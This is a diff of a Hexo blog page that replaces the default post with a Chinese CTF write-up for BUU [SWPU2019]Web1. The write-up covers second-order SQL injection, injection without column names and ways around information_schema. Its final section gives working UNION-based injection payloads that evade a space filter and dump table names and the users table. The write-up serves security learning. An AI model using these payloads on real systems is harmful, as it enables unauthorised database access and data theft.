@@ -20,27 +20,38 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"li1x.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":true,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+    <meta name="description" content="[SWPU2019]Web1 二次注入题参考:https:&#x2F;&#x2F;blog.csdn.net&#x2F;satasun&#x2F;article&#x2F;details&#x2F;109391116  知识点:   二次注入  无列名注入  information_schema的过滤   1.二次注入原理 1.用户向数据库中插入恶意数据（即使后端代码对语句进行了转义，如mysql_escape_string、mysql_real_esca">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="https://li1x.github.io/hello-world/index.html">
+<meta property="og:title" content="BUU-[SWPU2019]Web1的Wp">
+<meta property="og:url" content="https://li1x.github.io/CTF/Web/BUU-[SWPU2019]Web1/index.html">
 <meta property="og:site_name" content="Li1x&#39;s Blog">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:description" content="[SWPU2019]Web1 二次注入题参考:https:&#x2F;&#x2F;blog.csdn.net&#x2F;satasun&#x2F;article&#x2F;details&#x2F;109391116  知识点:   二次注入  无列名注入  information_schema的过滤   1.二次注入原理 1.用户向数据库中插入恶意数据（即使后端代码对语句进行了转义，如mysql_escape_string、mysql_real_esca">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2024-01-17T16:39:55.312Z">
-<meta property="article:modified_time" content="2024-01-17T16:36:38.646Z">
+<meta property="og:image" content="https://li1x.github.io/CTF/Web/BUU-%5BSWPU2019%5DWeb1/sql00.png">
+<meta property="og:image" content="https://li1x.github.io/CTF/Web/BUU-%5BSWPU2019%5DWeb1/sql01.png">
+<meta property="og:image" content="https://li1x.github.io/CTF/Web/BUU-%5BSWPU2019%5DWeb1/sql02.png">
+<meta property="og:image" content="https://li1x.github.io/CTF/Web/BUU-%5BSWPU2019%5DWeb1/sql03.png">
+<meta property="og:image" content="https://li1x.github.io/CTF/Web/BUU-%5BSWPU2019%5DWeb1/sql04.png">
+<meta property="og:image" content="https://li1x.github.io/CTF/Web/BUU-%5BSWPU2019%5DWeb1/00.png">
+<meta property="og:image" content="https://li1x.github.io/CTF/Web/BUU-%5BSWPU2019%5DWeb1/01.png">
+<meta property="og:image" content="https://li1x.github.io/CTF/Web/BUU-%5BSWPU2019%5DWeb1/payload00.png">
+<meta property="og:image" content="https://li1x.github.io/CTF/Web/BUU-%5BSWPU2019%5DWeb1/payload01.png">
+<meta property="og:image" content="https://li1x.github.io/CTF/Web/BUU-%5BSWPU2019%5DWeb1/payload03.png">
+<meta property="article:published_time" content="2024-02-28T16:49:23.491Z">
+<meta property="article:modified_time" content="2024-02-28T16:52:15.988Z">
 <meta property="article:author" content="Li1x">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://li1x.github.io/CTF/Web/BUU-%5BSWPU2019%5DWeb1/sql00.png">
 
 
-<link rel="canonical" href="https://li1x.github.io/hello-world/">
+<link rel="canonical" href="https://li1x.github.io/CTF/Web/BUU-[SWPU2019]Web1/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://li1x.github.io/hello-world/","path":"hello-world/","title":"Hello World"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://li1x.github.io/CTF/Web/BUU-[SWPU2019]Web1/","path":"CTF/Web/BUU-[SWPU2019]Web1/","title":"BUU-[SWPU2019]Web1的Wp"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>Hello World | Li1x's Blog</title>
+<title>BUU-[SWPU2019]Web1的Wp | Li1x's Blog</title>
   
 
 
@@ -140,7 +151,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Quick-Start"><span class="nav-number">1.</span> <span class="nav-text">Quick Start</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Create-a-new-post"><span class="nav-number">1.1.</span> <span class="nav-text">Create a new post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Run-server"><span class="nav-number">1.2.</span> <span class="nav-text">Run server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Generate-static-files"><span class="nav-number">1.3.</span> <span class="nav-text">Generate static files</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Deploy-to-remote-sites"><span class="nav-number">1.4.</span> <span class="nav-text">Deploy to remote sites</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPU2019-Web1-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E9%A2%98"><span class="nav-number">1.</span> <span class="nav-text">[SWPU2019]Web1 二次注入题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.</span> <span class="nav-text">1.二次注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5-%E2%80%94-%E5%9C%A8%E4%B8%8D%E7%9F%A5%E9%81%93%E5%88%97%E5%90%8D%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E8%BF%9B%E8%A1%8Csql%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.</span> <span class="nav-text">2.无列名注入 — 在不知道列名的情况下进行sql注入.</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-bypass-information-schema"><span class="nav-number">1.3.</span> <span class="nav-text">3.bypass information_schema</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98"><span class="nav-number">1.4.</span> <span class="nav-text">解题</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -187,7 +198,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://li1x.github.io/hello-world/">
+    <link itemprop="mainEntityOfPage" href="https://li1x.github.io/CTF/Web/BUU-[SWPU2019]Web1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -200,12 +211,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="Hello World | Li1x's Blog">
+      <meta itemprop="name" content="BUU-[SWPU2019]Web1的Wp | Li1x's Blog">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Hello World
+          BUU-[SWPU2019]Web1的Wp
         </h1>
 
         <div class="post-meta-container">
@@ -217,7 +228,16 @@
       <span class="post-meta-item-text">Posted on</span>
       
 
-      <time title="Created: 2024-01-18 00:39:55 / Modified: 00:36:38" itemprop="dateCreated datePublished" datetime="2024-01-18T00:39:55+08:00">2024-01-18</time>
+      <time title="Created: 2024-02-29 00:49:23 / Modified: 00:52:15" itemprop="dateCreated datePublished" datetime="2024-02-29T00:49:23+08:00">2024-02-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
     </span>
 
   
@@ -236,8 +256,8 @@
       </span>
       <span class="post-meta-item-text">Disqus: </span>
     
-    <a title="disqus" href="/hello-world/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="hello-world/" itemprop="commentCount"></span>
+    <a title="disqus" href="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="CTF/Web/BUU-[SWPU2019]Web1/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -248,14 +268,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">Word count in article: </span>
-      <span>367</span>
+      <span>2k</span>
     </span>
     <span class="post-meta-item" title="Reading time">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>1 mins.</span>
+      <span>4 mins.</span>
     </span>
 </div>
 
@@ -265,19 +285,63 @@
     
     
     
-    <div class="post-body" itemprop="articleBody"><p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+    <div class="post-body" itemprop="articleBody"><h2 id="SWPU2019-Web1-二次注入题"><a href="#SWPU2019-Web1-二次注入题" class="headerlink" title="[SWPU2019]Web1 二次注入题"></a>[SWPU2019]Web1 二次注入题</h2><p><strong>参考</strong>:<a target="_blank" rel="noopener" href="https://blog.csdn.net/satasun/article/details/109391116">https://blog.csdn.net/satasun/article/details/109391116</a></p>
+<hr>
+<p>知识点:</p>
+<ul>
+<li><input disabled type="checkbox"> <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/105899269">二次注入</a></li>
+<li><input disabled type="checkbox"> <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/98206699">无列名注入</a></li>
+<li><input disabled type="checkbox"> <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/193512">information_schema的过滤</a></li>
+</ul>
+<hr>
+<h3 id="1-二次注入"><a href="#1-二次注入" class="headerlink" title="1.二次注入"></a>1.二次注入</h3><p><strong>原理</strong></p>
+<p>1.用户向数据库中插入恶意数据（即使后端代码对语句进行了转义，如mysql_escape_string、mysql_real_escape_string转义）</p>
+<p>2.数据库对自己存储的数据非常放心，直接取出恶意数据给用户</p>
+<p><strong>过程</strong></p>
+<p>(1)插入1’#</p>
+<p>(2)转义成了1’\#</p>
+<p>(3)放在数据库中还是1’#</p>
+<p>(4)再取出这些数据时，不会转义 &#x3D;&gt; 取出的是 1’# &#x3D;&gt; 完成注入</p>
+<h3 id="2-无列名注入-—-在不知道列名的情况下进行sql注入"><a href="#2-无列名注入-—-在不知道列名的情况下进行sql注入" class="headerlink" title="2.无列名注入 — 在不知道列名的情况下进行sql注入."></a>2.无列名注入 — 在不知道列名的情况下进行sql注入.</h3><p>在mysql&gt;&#x3D;5的版本中，有一个information_schema的库，里面记录着mysql所有表的结构，在sql注入中，我们会通过这个库来获取其他表的结构（列名，表名）。</p>
+<p><strong>原理</strong></p>
+<p>将我们不知道的列名进行取别名操作，在取别名的同时进行数据查询。</p>
+<p><strong>操作</strong></p>
+<p>1.<code>select * from list;</code></p>
+<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/sql00.png"></p>
+<p>2.<code>select 1,2,3 union select * from list;</code></p>
+<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/sql01.png"></p>
+<p>3.select <code>3</code> from (select 1,2,3 union select * from list)a;</p>
+<p>-&gt;末尾的a可以是任意字符，用于命名</p>
+<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/sql02.png"></p>
+<p>4.<code>select b from (select 1,2,3 as b union select * from list)a;</code></p>
+<p>-&gt;如果过滤了&#96;&#96;反引号，起别名</p>
+<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/sql03.png"></p>
+<p>5.select concat(<code>2</code>,0x2d,<code>3</code>) from (select 1,2,3 union select * from list)a limit 1,3;</p>
+<p>-&gt;多列查询</p>
+<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/sql04.png"></p>
+<p>payload: <strong>select a,b from posts where a&#x3D;-1 union select 1,(select concat(<code>3</code>,0x2d,<code>4</code>) from (select 1,2,3,4,5,6 union select * from xxx)a limit 1,1);</strong></p>
+<h3 id="3-bypass-information-schema"><a href="#3-bypass-information-schema" class="headerlink" title="3.bypass information_schema"></a>3.bypass information_schema</h3><p><code>information_schema是什么?</code></p>
+<p>-&gt;保存着mysql服务器所维护的所有其他数据库的信息，包括了数据库名，表名，字段名等。</p>
+<p>-&gt;在注入中，infromation_schema库的作用无非就是可以获取到table_schema,table_name,column_name这些数据库内的信息。</p>
+<p><strong>Mysql在5.7版本新增了sys schema 基础数据来自于performance_chema和information_schema两个库，本身数据库不存储数据。</strong></p>
+<p>sys.schema_auto_increment_columns</p>
+<p>-&gt;对表自增字段的监控.</p>
+<p>-&gt;只要有自增字段，那么就可以通过这个库来查询到 &#x3D;&gt; 代替了information_schema</p>
+<p><strong>前提: 注入的表中存在自增字段</strong></p>
+<p>如果没有呢（下面两个可以代替）</p>
+<p>-&gt;schema_table_statistics_with_buffer</p>
+<p>-&gt;sys.x$schema_table_statistics_with_buffer</p>
+<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>进入网站，随便注册一个账号进入，可以发布广告 &#x3D;&gt; 想到了xss(不是很熟悉,不知道怎么去验证,看wp说是二次注入)</p>
+<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/00.png"></p>
+<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/01.png"></p>
+<p>确定存在sql注入,且为二次注入 过滤了空格,or,注释符</p>
+<p><strong>payload:</strong></p>
+<p>1.<code>1&#39;/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></p>
+<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/payload00.png"></p>
+<p>2.<code>1&#39;/**/union/**/select/**/1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=&quot;web1&quot;&#39;</code></p>
+<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/payload01.png"></p>
+<p>3.<code>1&#39;/**/union/**/select/**/1,database(),(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></p>
+<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/payload03.png"></p>
 
     </div>
 
@@ -291,11 +355,11 @@
 
           <div class="post-nav">
             <div class="post-nav-item">
+                <a href="/CTF/Web/BUU-easy_serialize_php/" rel="prev" title="BUU-easy_serialize_php的Wp">
+                  <i class="fa fa-angle-left"></i> BUU-easy_serialize_php的Wp
+                </a>
             </div>
             <div class="post-nav-item">
-                <a href="/CTF/Web/BUU-easy_web/" rel="next" title="BUU-easy_web的Wp">
-                  BUU-easy_web的Wp <i class="fa fa-angle-right"></i>
-                </a>
             </div>
           </div>
     </footer>
